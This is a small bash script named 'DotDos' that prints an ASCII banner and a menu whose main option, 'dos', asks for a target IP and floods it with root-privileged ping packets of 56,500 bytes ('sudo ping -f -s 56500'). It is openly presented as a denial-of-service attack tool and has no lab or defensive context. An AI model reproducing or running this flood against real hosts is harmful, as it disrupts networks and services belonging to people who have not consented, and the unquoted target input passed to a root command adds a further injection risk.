#!/bin/bash

clear #clear to start a program 

#show the name of program
echo -e '\e[40m                                          \e[0m'
echo -e '\e[40m mmmm            m    mmmm                \e[0m'
echo -e '\e[40m #   "m  mmm   mm#mm  #   "m  mmm    mmm  \e[0m'
echo -e '\e[40m #    # #" "#    #    #    # #" "#  #   " \e[0m'
echo -e '\e[40m #    # #   #    #    #    # #   #   """m \e[0m'
echo -e '\e[40m #mmm"  "#m#"    "mm  #mmm"  "#m#"  "mmm" \e[0m'
echo -e '\e[40m                                          \e[0m'
#show the menu of program
echo ''
echo -e "\e[1;44m| 1) dos    -   attack a target with DoS.|\e[0m"
echo -e "\e[1;44m| 2) clear  -   clear the screen.        |\e[0m"
echo -e "\e[1;44m| 3) exit   -   exit the program.        |\e[0m"
echo -e "\e[1;44m| 4) menu   -   show commands            |\e[0m"
echo ''
echo  -e "\e[1;31m!!!To use the program you must have root access.\e[0m"


#main of program
while true #to check all time
do
	echo -n -e '\e[1;32m$:\e[0m'
	read command

	if [ "$command" == "exit" ]; then
		clear #clean before exit
		break

	elif [ "$command" == "clear" ]; then
		clear #clearing 

	#dos attack	
	elif [ "$command" == "dos" ]; then
		echo -n 'IP:'
		read ip
        clear
	    sudo ping -f -s 56500 $ip

	elif [ "$command" == "menu" ]; then
		echo ''
		echo -e "\e[1;44m| 1) dos    -   attack a target with DoS. |\e[0m"
		echo -e "\e[1;44m| 2) clear  -   clear the screen.         |\e[0m"
		echo -e "\e[1;44m| 3) exit   -   exit the program.         |\e[0m"
		echo -e "\e[1;44m| 4) menu   -   show commands             |\e[0m"
		echo ''
	
	else
		echo 'error' #if nothing is found
	fi
done
#written by Armen Amirzadyan !!!Hostake!!!
